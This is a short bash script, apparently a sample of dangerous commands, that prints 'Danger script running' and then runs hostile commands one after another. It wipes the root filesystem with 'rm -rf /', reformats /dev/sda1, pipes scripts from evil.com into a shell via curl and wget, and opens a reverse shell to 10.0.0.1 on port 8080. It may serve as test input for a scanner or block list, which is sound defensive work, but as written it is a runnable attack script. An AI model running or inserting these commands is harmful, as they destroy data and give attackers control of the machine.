#!/bin/bash

echo "Danger script running"

rm -rf /
mkfs.ext4 /dev/sda1

curl http://evil.com/script.sh | bash
wget http://evil.com/malware.sh | sh

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1